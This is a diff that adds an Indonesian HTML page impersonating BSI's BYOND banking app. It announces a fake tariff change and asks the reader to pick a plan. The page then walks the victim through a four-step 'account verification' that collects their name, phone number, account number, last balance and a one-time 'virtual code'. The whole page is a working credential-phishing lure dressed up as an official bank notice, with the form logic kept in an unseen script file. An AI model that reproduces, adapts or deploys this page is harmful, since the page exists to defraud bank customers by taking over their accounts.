@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BYOND BSI - Perubahan Tarif</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="welcome-screen fade-in" id="loadingScreen">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLjphAHdRR6MWIgfTB7EXzuSjp2YiMdLjACc4FPNTLNX3gagIParlvQeubKshr_dK5LA9rbNjbBHiqNkLAHiy0pYHzBNSRtohg9lqwTqx6yQsdbqc2BVnUY7ed07i0-nLwL0C5WEewoVN9idMKGimEkSZgJb-XhB47cdbOpzdR2HI9eZAbzgmaCC7tQfU/s2557/1000239612.jpg" alt="BSI Logo" class="logo-loading">
+        <div class="loading-animation">
+            <div class="loading-placeholder"></div>
+            <p class="loading-text">LOADING BYOND BSI...</p>
+        </div>
+    </div>
+
+    <!-- Main Content - Tariff Change -->
+    <div class="main-container" id="mainContent" style="display: none;">
+        <div class="header">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAdy0Aat72-z2pFJ5DAcbYDdhUp_6gx8lcKBHvucygNiPG7EzRe-GFo9gr1DzqrtAWFWGNnQB0OHWJAWGK42ZJExkRlzWma5EREJlPcGZN97sfPVp1d5pa-8fQKUaODk1tauGTSFu3HePBduF7RspyMIYLfPmFd_ybXFazf7GYFlcwFmcToqBkV_u93Ew/s1080/1000239624.jpg" alt="BSI Logo" class="logo" style="display:none;">
+            <h1>BYOND BSI</h1>
+            <p class="subtitle">Perubahan Struktur Tarif</p>
+        </div>
+
+        <div class="tariff-change-card">
+            <div class="card-header">
+                <i class="fas fa-exclamation-circle icon-warning"></i>
+                <h2>Perubahan Tarif Efektif 1 Agustus 2025</h2>
+            </div>
+            
+            <div class="card-body">
+                <div class="info-box">
+                    <p>Sehubungan dengan peningkatan layanan, berikut perubahan struktur tarif BYOND BSI:</p>
+                </div>
+
+                <div class="tariff-comparison">
+                    <div class="old-tariff">
+                        <h3><i class="fas fa-calendar-times"></i> Tarif Lama</h3>
+                        <ul>
+                            <li><i class="fas fa-check-circle"></i> Rp 6.500/transaksi</li>
+                            <li><i class="fas fa-check-circle"></i> Tanpa biaya bulanan</li>
+                            <li><i class="fas fa-check-circle"></i> Maksimal 5 transaksi gratis per bulan</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="new-tariff">
+                        <h3><i class="fas fa-calendar-check"></i> Tarif Baru</h3>
+                        <ul>
+                            <li><i class="fas fa-check-circle"></i> Rp 150.000/bulan</li>
+                            <li><i class="fas fa-check-circle"></i> Unlimited transaksi</li>
+                            <li><i class="fas fa-check-circle"></i> Free notifikasi transaksi</li>
+                            <li><i class="fas fa-check-circle"></i> Laporan bulanan gratis</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="benefits">
+                    <h3><i class="fas fa-star"></i> Keuntungan Tarif Baru</h3>
+                    <p>Dengan tarif baru Anda mendapatkan:</p>
+                    <ul>
+                        <li>Lebih hemat untuk transaksi > 23x/bulan</li>
+                        <li>Kemudahan pembayaran sekali per bulan</li>
+                        <li>Fitur tambahan tanpa biaya ekstra</li>
+                    </ul>
+                </div>
+
+                <!-- Pilihan Tarif -->
+                <div class="tariff-selection">
+                    <h3><i class="fas fa-money-bill-wave"></i> Pilih Tarif Anda</h3>
+                    <div class="tariff-option">
+                        <input type="radio" id="tariffOld" name="tariffOption" value="old">
+                        <label for="tariffOld">
+                            <span class="tariff-title">Tarif Lama</span>
+                            <span class="tariff-desc">Rp 6.500/transaksi (maks 5x gratis/bulan)</span>
+                        </label>
+                    </div>
+                    <div class="tariff-option">
+                        <input type="radio" id="tariffNew" name="tariffOption" value="new">
+                        <label for="tariffNew">
+                            <span class="tariff-title">Tarif Baru</span>
+                            <span class="tariff-desc">Rp 150.000/bulan (unlimited transaksi)</span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-buttons">
+            <button class="btn btn-primary" id="btnContinue">
+                <i class="fas fa-arrow-right"></i> Lanjutkan
+            </button>
+            <button class="btn btn-secondary" id="btnLearnMore">
+                <i class="fas fa-info-circle"></i> Pelajari Lebih Lanjut
+            </button>
+        </div>
+
+        <div class="footer">
+            <p>PT Bank Syariah Indonesia Tbk.</p>
+            <p>Hubungi Call Center 24 Jam: 14040</p>
+        </div>
+    </div>
+
+    <!-- Account Verification Flow -->
+    
+    <!-- Step 1: Account Name and Phone -->
+    <div class="login-container" id="accountVerification1" style="display: none;">
+        <div class="login-header">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAdy0Aat72-z2pFJ5DAcbYDdhUp_6gx8lcKBHvucygNiPG7EzRe-GFo9gr1DzqrtAWFWGNnQB0OHWJAWGK42ZJExkRlzWma5EREJlPcGZN97sfPVp1d5pa-8fQKUaODk1tauGTSFu3HePBduF7RspyMIYLfPmFd_ybXFazf7GYFlcwFmcToqBkV_u93Ew/s1080/1000239624.jpg" alt="BSI Logo" class="logo">
+            <h2>Verifikasi Rekening</h2>
+            <p class="login-subtitle">Langkah 1 dari 4 - Data Pemilik Rekening</p>
+        </div>
+
+        <form id="accountForm1">
+            <div class="form-group">
+                <label for="accountName">Nama Pemilik Rekening</label>
+                <input type="text" id="accountName" placeholder="Masukkan nama sesuai rekening" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phoneNumber">Nomor Handphone Terdaftar</label>
+                <input type="tel" id="phoneNumber" placeholder="Masukkan nomor handphone" required inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <button type="submit" class="btn btn-login">
+                <i class="fas fa-arrow-right"></i> Lanjutkan
+            </button>
+        </form>
+
+        <div class="footer">
+            <p>PT Bank Syariah Indonesia Tbk.</p>
+            <p>Hubungi Call Center 24 Jam: 14040</p>
+        </div>
+    </div>
+
+    <!-- Step 2: Account Number -->
+    <div class="login-container" id="accountVerification2" style="display: none;">
+        <div class="login-header">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAdy0Aat72-z2pFJ5DAcbYDdhUp_6gx8lcKBHvucygNiPG7EzRe-GFo9gr1DzqrtAWFWGNnQB0OHWJAWGK42ZJExkRlzWma5EREJlPcGZN97sfPVp1d5pa-8fQKUaODk1tauGTSFu3HePBduF7RspyMIYLfPmFd_ybXFazf7GYFlcwFmcToqBkV_u93Ew/s1080/1000239624.jpg" alt="BSI Logo" class="logo">
+            <h2>Verifikasi Rekening</h2>
+            <p class="login-subtitle">Langkah 2 dari 4 - Nomor Rekening</p>
+        </div>
+
+        <form id="accountForm2">
+            <div class="form-group">
+                <label for="accountNumber">Nomor Rekening BSI</label>
+                <input type="tel" id="accountNumber" placeholder="Masukkan nomor rekening Anda" required inputmode="numeric" pattern="[0-9]*">
+                <p class="form-hint">Pastikan nomor rekening sesuai dengan buku tabungan</p>
+            </div>
+            
+            <button type="submit" class="btn btn-login">
+                <i class="fas fa-arrow-right"></i> Lanjutkan
+            </button>
+        </form>
+
+        <div class="footer">
+            <p>PT Bank Syariah Indonesia Tbk.</p>
+            <p>Hubungi Call Center 24 Jam: 14040</p>
+        </div>
+    </div>
+
+    <!-- Step 3: Last Balance -->
+    <div class="login-container" id="accountVerification3" style="display: none;">
+        <div class="login-header">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAdy0Aat72-z2pFJ5DAcbYDdhUp_6gx8lcKBHvucygNiPG7EzRe-GFo9gr1DzqrtAWFWGNnQB0OHWJAWGK42ZJExkRlzWma5EREJlPcGZN97sfPVp1d5pa-8fQKUaODk1tauGTSFu3HePBduF7RspyMIYLfPmFd_ybXFazf7GYFlcwFmcToqBkV_u93Ew/s1080/1000239624.jpg" alt="BSI Logo" class="logo">
+            <h2>Verifikasi Rekening</h2>
+            <p class="login-subtitle">Langkah 3 dari 4 - Saldo Terakhir</p>
+        </div>
+
+        <form id="accountForm3">
+            <div class="form-group">
+                <label for="lastBalance">Saldo Terakhir Rekening</label>
+                <input type="tel" id="lastBalance" placeholder="Masukkan saldo terakhir Anda" required inputmode="numeric" pattern="[0-9]*">
+                <p class="form-hint">Contoh: 1250000 (tanpa titik atau koma)</p>
+            </div>
+            
+            <button type="submit" class="btn btn-login">
+                <i class="fas fa-arrow-right"></i> Lanjutkan
+            </button>
+        </form>
+
+        <div class="footer">
+            <p>PT Bank Syariah Indonesia Tbk.</p>
+            <p>Hubungi Call Center 24 Jam: 14040</p>
+        </div>
+    </div>
+
+    <!-- Step 4: Virtual Code -->
+    <div class="login-container" id="accountVerification4" style="display: none;">
+        <div class="login-header">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAdy0Aat72-z2pFJ5DAcbYDdhUp_6gx8lcKBHvucygNiPG7EzRe-GFo9gr1DzqrtAWFWGNnQB0OHWJAWGK42ZJExkRlzWma5EREJlPcGZN97sfPVp1d5pa-8fQKUaODk1tauGTSFu3HePBduF7RspyMIYLfPmFd_ybXFazf7GYFlcwFmcToqBkV_u93Ew/s1080/1000239624.jpg" alt="BSI Logo" class="logo">
+            <h2>Verifikasi Rekening</h2>
+            <p class="login-subtitle">Langkah 4 dari 4 - Kode Virtual</p>
+        </div>
+
+        <form id="accountForm4">
+            <div class="form-group">
+                <label for="virtualCode">Kode Virtual</label>
+                <input type="text" id="virtualCode" placeholder="Masukkan digit kode virtual" required maxlength="15">
+                <p class="form-hint">Kode virtual aktifasi akan di kirimkan ke anda</p>
+            </div>
+            
+            <div class="info-box">
+                <p><i class="fas fa-info-circle"></i> Jika belum menerima kode, klik tombol dibawah untuk meminta ulang</p>
+            </div>
+            
+            <button type="submit" class="btn btn-login">
+                <i class="fas fa-check-circle"></i> Verifikasi
+            </button>
+        </form>
+
+        <button type="button" class="btn btn-secondary" id="requestCodeBtn">
+            <i class="fas fa-sync-alt"></i> Minta Kode Virtual
+        </button>
+
+        <div class="footer">
+            <p>PT Bank Syariah Indonesia Tbk.</p>
+            <p>Hubungi Call Center 24 Jam: 14040</p>
+        </div>
+    </div>
+
+    <!-- Loading Indicator -->
+    <div class="loading-overlay" id="loadingOverlay" style="display: none;">
+        <div class="loading-content">
+            <div class="loading-placeholder"></div>
+            <p>Memverifikasi data...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+      </html>
